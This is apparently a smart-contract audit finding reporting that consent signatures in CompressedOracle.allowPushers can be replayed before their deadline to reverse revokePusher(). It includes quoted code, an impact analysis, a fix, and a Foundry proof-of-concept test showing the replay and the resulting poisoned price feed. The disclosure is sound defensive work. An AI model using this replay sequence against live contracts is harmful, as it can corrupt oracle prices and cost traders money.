### Title
Pusher delegation consent signature can be replayed within deadline window to silently undo `revokePusher()` — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`CompressedOracle.allowPushers` verifies a pusher's EIP-191 consent signature and checks that `block.timestamp <= deadline`, but never marks the signature as consumed. A creator who holds a still-valid consent signature can replay it an unlimited number of times within the deadline window. The critical consequence is that a pusher who calls `revokePusher()` to terminate their delegation can have that revocation silently undone by the creator replaying the original signature, causing the pusher's subsequent price pushes to land in the creator's namespace rather than their own.

---

### Finding Description

`allowPushers` in `CompressedOracle.sol` constructs and verifies a consent hash:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));

namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

The only replay guard is `_ensureDeadline`, which simply checks `block.timestamp <= deadline`: [2](#0-1) 

There is no nonce, no used-signature bitmap, and no one-time-use flag. The signed tuple `(chainid, oracle, deadline, pusher, creator)` is identical on every call, so the same `(deadline, signature)` pair passes verification repeatedly until the deadline expires.

The code's own NatSpec acknowledges the deadline is the sole guard against post-revocation replay:

> *"the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."* [3](#0-2) 

But the deadline only prevents replay **after** it expires. Within the window `[now, deadline]`, the signature is freely replayable. `revokePusher()` clears `namespaceRemapping[pusher]` to `address(0)`: [4](#0-3) 

But the creator can immediately call `allowPushers` again with the same `(deadline, signature)` to restore `namespaceRemapping[pusher] = creator`, bypassing the revocation.

---

### Impact Explanation

After the creator replays the signature, the `fallback()` push path resolves the pusher's namespace as:

```solidity
address creator = namespaceRemapping[msg.sender];
if (creator == address(0)) creator = msg.sender;
``` [5](#0-4) 

The pusher believes they are pushing into their own namespace (having revoked), but every push lands in the creator's namespace. The creator's oracle feeds receive prices the pusher did not intend for them — prices that may be for a different asset pair, a different scale, or simply stale relative to what the creator's pools expect. Any pool whose `price()` call resolves through the creator's `feedId` will consume these corrupted values, producing bad-price execution: swaps execute at wrong bid/ask rates, traders receive more or less than the oracle curve permits, and pool solvency invariants can break.

---

### Likelihood Explanation

The trigger requires only that:
1. A pusher signed a consent with a future deadline (normal operational practice).
2. The pusher calls `revokePusher()` before the deadline expires.
3. The creator replays the original `(deadline, signature)` — a single on-chain transaction with data the creator already possesses.

No privileged role, no special setup, and no off-chain coordination beyond what the creator already holds. The deadline window is chosen by the creator at delegation time and can be set to days or weeks, giving a large replay window.

---

### Recommendation

Mark each consent signature as consumed after first use by storing a `mapping(bytes32 => bool) private _usedConsents` keyed on the signature hash (or the full digest), and revert if the same digest is presented again:

```solidity
mapping(bytes32 => bool) private _usedConsents;

function allowPushers(...) external {
    _ensureDeadline(deadline);
    ...
    bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
    );
    require(!_usedConsents[hash], "consent already used");
    require(pusher == ECDSA.recover(hash, signatures[i]));
    _usedConsents[hash] = true;
    namespaceRemapping[pusher] = msg.sender;
    ...
}
```

Alternatively, include a per-pusher nonce in the signed message and increment it on each successful `allowPushers` call, mirroring the fix applied to `SecuritizeOnRamp`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Foundry test — add to smart-contracts-poc/test/oracles/compressed/

function testReplayAllowPushersUndoesRevocation() public {
    uint256 deadline = block.timestamp + 1 days;

    // 1. Pusher signs consent for creator
    bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

    address[] memory pushers = new address[](1);
    pushers[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator establishes delegation
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator, "step 2: mapped");

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0), "step 3: revoked");

    // 4. Creator replays the SAME signature — deadline still valid, no nonce check
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers, sigs); // must revert but does NOT

    // 5. Revocation silently undone
    assertEq(oracle.namespaceRemapping(pusher), creator, "VULN: revocation bypassed");

    // 6. Pusher's next push lands in creator's namespace, not their own
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(9_999_999, 7, 7); // extreme price pusher never intended for creator
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);

    // Creator's feed is now poisoned with the pusher's unintended price
    IOffchainOracle.OracleData memory data = oracle.getOracleData(oracle.feedIdOf(creator, 0, 0));
    assertEq(data.price, U64x32.decode(uint32(raw >> 16)), "creator feed poisoned");

    // Pusher's own namespace is empty — they got no update they intended
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0, "pusher ns empty");
}
```
